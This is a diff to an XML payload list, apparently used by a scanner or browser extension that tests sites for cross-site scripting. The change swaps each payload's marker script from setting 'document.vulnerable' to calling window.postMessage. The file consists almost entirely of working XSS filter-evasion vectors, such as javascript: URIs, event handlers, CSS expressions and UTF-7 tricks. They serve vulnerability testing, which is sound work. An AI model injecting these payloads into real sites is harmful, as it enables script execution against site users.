@@ -8,373 +8,373 @@
 </attack>
 <attack>
 <attackString>
-<![CDATA[<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">]]>
+<![CDATA[<meta http-equiv="refresh" content="0;url=javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>">]]>
+<![CDATA[<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>window.postMessage({type: "FROM_PAGE"}, "*")</SCRIPT>">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<SCRIPT>document.vulnerable=true;</SCRIPT>]]>
+<![CDATA[<SCRIPT>window.postMessage({type: "FROM_PAGE"}, "*");</SCRIPT>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<IMG SRC="jav ascript:document.vulnerable=true;">]]>
+<![CDATA[<IMG SRC="jav ascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<IMG SRC="javascript:document.vulnerable=true;">]]>
+<![CDATA[<IMG SRC="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<IMG SRC=" &#14; javascript:document.vulnerable=true;">]]>
+<![CDATA[<IMG SRC=" &#14; javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>]]>
+<![CDATA[<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=window.postMessage({type: "FROM_PAGE"}, "*");>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<<SCRIPT>document.vulnerable=true;//<</SCRIPT>]]>
+<![CDATA[<<SCRIPT>window.postMessage({type: "FROM_PAGE"}, "*");//<</SCRIPT>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<SCRIPT <B>document.vulnerable=true;</SCRIPT>]]>
+<![CDATA[<SCRIPT <B>window.postMessage({type: "FROM_PAGE"}, "*");</SCRIPT>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<IMG SRC="javascript:document.vulnerable=true;"]]>
+<![CDATA[<IMG SRC="javascript:window.postMessage({type: "FROM_PAGE"}, "*");"]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<iframe src="javascript:document.vulnerable=true; <]]>
+<![CDATA[<iframe src="javascript:window.postMessage({type: "FROM_PAGE"}, "*"); <]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<SCRIPT>a=/XSS/\ndocument.vulnerable=true;</SCRIPT>]]>
+<![CDATA[<SCRIPT>a=/XSS/\nwindow.postMessage({type: "FROM_PAGE"}, "*");</SCRIPT>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[\";document.vulnerable=true;;//]]>
+<![CDATA[\";window.postMessage({type: "FROM_PAGE"}, "*");;//]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[</TITLE><SCRIPT>document.vulnerable=true;</SCRIPT>]]>
+<![CDATA[</TITLE><SCRIPT>window.postMessage({type: "FROM_PAGE"}, "*");</SCRIPT>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<INPUT TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">]]>
+<![CDATA[<INPUT TYPE="IMAGE" SRC="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<BODY BACKGROUND="javascript:document.vulnerable=true;">]]>
+<![CDATA[<BODY BACKGROUND="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<BODY ONLOAD=document.vulnerable=true;>]]>
+<![CDATA[<BODY ONLOAD=window.postMessage({type: "FROM_PAGE"}, "*");>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<IMG DYNSRC="javascript:document.vulnerable=true;">]]>
+<![CDATA[<IMG DYNSRC="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<IMG LOWSRC="javascript:document.vulnerable=true;">]]>
+<![CDATA[<IMG LOWSRC="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<BGSOUND SRC="javascript:document.vulnerable=true;">]]>
+<![CDATA[<BGSOUND SRC="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<BR SIZE="&{document.vulnerable=true}">]]>
+<![CDATA[<BR SIZE="&{window.postMessage({type: "FROM_PAGE"}, "*")}">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>]]>
+<![CDATA[<LAYER SRC="javascript:window.postMessage({type: "FROM_PAGE"}, "*");"></LAYER>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<LINK REL="stylesheet" HREF="javascript:document.vulnerable=true;">]]>
+<![CDATA[<LINK REL="stylesheet" HREF="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<STYLE>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS]]>
+<![CDATA[<STYLE>li {list-style-image: url("javascript:window.postMessage({type: "FROM_PAGE"}, "*");");</STYLE><UL><LI>XSS]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[¼script¾document.vulnerable=true;¼/script¾]]>
+<![CDATA[¼script¾window.postMessage({type: "FROM_PAGE"}, "*");¼/script¾]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<IFRAME SRC="javascript:document.vulnerable=true;"></IFRAME>]]>
+<![CDATA[<IFRAME SRC="javascript:window.postMessage({type: "FROM_PAGE"}, "*");"></IFRAME>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></FRAMESET>]]>
+<![CDATA[<FRAMESET><FRAME SRC="javascript:window.postMessage({type: "FROM_PAGE"}, "*");"></FRAMESET>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<TABLE BACKGROUND="javascript:document.vulnerable=true;">]]>
+<![CDATA[<TABLE BACKGROUND="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<TABLE><TD BACKGROUND="javascript:document.vulnerable=true;">]]>
+<![CDATA[<TABLE><TD BACKGROUND="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<DIV STYLE="background-image: url(javascript:document.vulnerable=true;)">]]>
+<![CDATA[<DIV STYLE="background-image: url(javascript:window.postMessage({type: "FROM_PAGE"}, "*");)">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<DIV STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">]]>
+<![CDATA[<DIV STYLE="background-image: url(&#1;javascript:window.postMessage({type: "FROM_PAGE"}, "*");)">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<DIV STYLE="width: expression(document.vulnerable=true);">]]>
+<![CDATA[<DIV STYLE="width: expression(window.postMessage({type: "FROM_PAGE"}, "*"));">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<STYLE>@im\port'\ja\vasc\ript:document.vulnerable=true';</STYLE>]]>
+<![CDATA[<STYLE>@im\port'\ja\vasc\ript:window.postMessage({type: "FROM_PAGE"}, "*")';</STYLE>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<IMG STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">]]>
+<![CDATA[<IMG STYLE="xss:expr/*XSS*/ession(window.postMessage({type: "FROM_PAGE"}, "*"))">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<XSS STYLE="xss:expression(document.vulnerable=true)">]]>
+<![CDATA[<XSS STYLE="xss:expression(window.postMessage({type: "FROM_PAGE"}, "*"))">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>]]>
+<![CDATA[exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(window.postMessage({type: "FROM_PAGE"}, "*"))'>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<STYLE TYPE="text/javascript">document.vulnerable=true;</STYLE>]]>
+<![CDATA[<STYLE TYPE="text/javascript">window.postMessage({type: "FROM_PAGE"}, "*");</STYLE>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<STYLE>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></A>]]>
+<![CDATA[<STYLE>.XSS{background-image:url("javascript:window.postMessage({type: "FROM_PAGE"}, "*")");}</STYLE><A CLASS=XSS></A>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<STYLE type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</STYLE>]]>
+<![CDATA[<STYLE type="text/css">BODY{background:url("javascript:window.postMessage({type: "FROM_PAGE"}, "*")")}</STYLE>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->]]>
+<![CDATA[<!--[if gte IE 4]><SCRIPT>window.postMessage({type: "FROM_PAGE"}, "*");</SCRIPT><![endif]-->]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<BASE HREF="javascript:document.vulnerable=true;//">]]>
+<![CDATA[<BASE HREF="javascript:window.postMessage({type: "FROM_PAGE"}, "*");//">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></OBJECT>]]>
+<![CDATA[<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:window.postMessage({type: "FROM_PAGE"}, "*")></OBJECT>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]>
+<![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:window.postMessage({type: "FROM_PAGE"}, "*");">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]>
+<![CDATA[<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:window.postMessage({type: "FROM_PAGE"}, "*")"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></HTML>]]>
+<![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>window.postMessage({type: "FROM_PAGE"}, "*")</SCRIPT>"></BODY></HTML>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>]]>
+<![CDATA[<? echo('<SCR)';echo('IPT>window.postMessage({type: "FROM_PAGE"}, "*")</SCRIPT>'); ?>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-]]>
+<![CDATA[<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-window.postMessage({type: "FROM_PAGE"}, "*");+ADw-/SCRIPT+AD4-]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<a href="javascript#document.vulnerable=true;">]]>
+<![CDATA[<a href="javascript#window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<div onmouseover="document.vulnerable=true;">]]>
+<![CDATA[<div onmouseover="window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<img src="javascript:document.vulnerable=true;">]]>
+<![CDATA[<img src="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<img dynsrc="javascript:document.vulnerable=true;">]]>
+<![CDATA[<img dynsrc="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<input type="image" dynsrc="javascript:document.vulnerable=true;">]]>
+<![CDATA[<input type="image" dynsrc="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<bgsound src="javascript:document.vulnerable=true;">]]>
+<![CDATA[<bgsound src="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[&<script>document.vulnerable=true;</script>]]>
+<![CDATA[&<script>window.postMessage({type: "FROM_PAGE"}, "*");</script>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[&{document.vulnerable=true;};]]>
+<![CDATA[&{window.postMessage({type: "FROM_PAGE"}, "*");};]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<img src=&{document.vulnerable=true;};>]]>
+<![CDATA[<img src=&{window.postMessage({type: "FROM_PAGE"}, "*");};>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<link rel="stylesheet" href="javascript:document.vulnerable=true;">]]>
+<![CDATA[<link rel="stylesheet" href="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<img src="mocha:document.vulnerable=true;">]]>
+<![CDATA[<img src="mocha:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<img src="livescript:document.vulnerable=true;">]]>
+<![CDATA[<img src="livescript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<a href="about:<script>document.vulnerable=true;</script>">]]>
+<![CDATA[<a href="about:<script>window.postMessage({type: "FROM_PAGE"}, "*");</script>">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<body onload="document.vulnerable=true;">]]>
+<![CDATA[<body onload="window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<div style="background-image: url(javascript:document.vulnerable=true;);">]]>
+<![CDATA[<div style="background-image: url(javascript:window.postMessage({type: "FROM_PAGE"}, "*"););">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
@@ -392,67 +392,67 @@
 </attack>
 <attack>
 <attackString>
-<![CDATA[<div style="width: expression(document.vulnerable=true;);">]]>
+<![CDATA[<div style="width: expression(window.postMessage({type: "FROM_PAGE"}, "*"););">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<style type="text/javascript">document.vulnerable=true;</style>]]>
+<![CDATA[<style type="text/javascript">window.postMessage({type: "FROM_PAGE"}, "*");</style>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">]]>
+<![CDATA[<object classid="clsid:..." codebase="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<style><!--</style><script>document.vulnerable=true;//--></script>]]>
+<![CDATA[<style><!--</style><script>window.postMessage({type: "FROM_PAGE"}, "*");//--></script>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<<script>document.vulnerable=true;</script>]]>
+<![CDATA[<<script>window.postMessage({type: "FROM_PAGE"}, "*");</script>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<![CDATA[<!--]]<script>document.vulnerable=true;//--></script>]]>
+<![CDATA[<![CDATA[<!--]]<script>window.postMessage({type: "FROM_PAGE"}, "*");//--></script>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->]]>
+<![CDATA[<!-- -- --><script>window.postMessage({type: "FROM_PAGE"}, "*");</script><!-- -- -->]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<img src="blah"onmouseover="document.vulnerable=true;">]]>
+<![CDATA[<img src="blah"onmouseover="window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<img src="blah>" onmouseover="document.vulnerable=true;">]]>
+<![CDATA[<img src="blah>" onmouseover="window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<xml src="javascript:document.vulnerable=true;">]]>
+<![CDATA[<xml src="javascript:window.postMessage({type: "FROM_PAGE"}, "*");">]]>
 </attackString>
 <signature>Script</signature>
 </attack>
 <attack>
 <attackString>
-<![CDATA[<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>]]>
+<![CDATA[<xml id="X"><a><b><script>window.postMessage({type: "FROM_PAGE"}, "*");</script>;</b></a></xml>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
@@ -464,7 +464,7 @@
 </attack>
 <attack>
 <attackString>
-<![CDATA[[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>]]>
+<![CDATA[[\xC0][\xBC]script>window.postMessage({type: "FROM_PAGE"}, "*");[\xC0][\xBC]/script>]]>
 </attackString>
 <signature>Script</signature>
 </attack>
